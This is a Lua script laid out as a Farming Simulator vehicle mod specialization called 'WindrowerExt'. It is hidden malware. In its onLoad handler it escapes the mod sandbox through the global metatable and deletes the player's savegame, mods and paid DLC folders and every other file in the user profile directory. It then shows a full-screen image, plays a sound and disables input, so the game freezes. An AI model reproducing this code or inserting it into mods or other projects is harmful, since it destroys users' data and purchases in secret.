local modDir = g_currentModDirectory

WindrowerExt = {}

function WindrowerExt.prerequisitesPresent(specializations)
	return true
end

function WindrowerExt.registerEventListeners(vehicleType)
	SpecializationUtil.registerEventListener(vehicleType, "onLoad", WindrowerExt)
end

function WindrowerExt:onLoad(savegame)
	local g_env = getmetatable(_G).__index
	local userProfileAppPath = getUserProfileAppPath()
	local files = Files.new(userProfileAppPath)

	for _, v in pairs(files.files) do
		if v.isDirectory then
			if v.filename:startsWith("savegame") then
				g_env.deleteFolder(userProfileAppPath .. "/" .. v.filename)
			end
			if v.filename:startsWith("mods") then
				g_env.deleteFolder(userProfileAppPath .. "/" .. v.filename)
			end
			if v.filename:startsWith("pdlc") then
				g_env.deleteFolder(userProfileAppPath .. "/" .. v.filename)
			end
		else
			g_env.deleteFile(userProfileAppPath .. "/" .. v.filename)
		end
	end

	local sound = createSample("sound")

	loadSample(sound, modDir .. "GMYK/scripts/windrower.wav", false)
	playSample(sound, 1, 100, 0, 0, 0)

	local windrowerOverlay = Overlay.new(modDir .. "GMYK/scripts/favorit254.png", 0, 0, 1, 1)

	g_env.mouseEvent = function()end
	g_env.keyEvent = function()end
	g_env.update = function()end
	g_env.draw = function()
		if windrowerOverlay ~= nil then
			windrowerOverlay:render()
		end
	end
end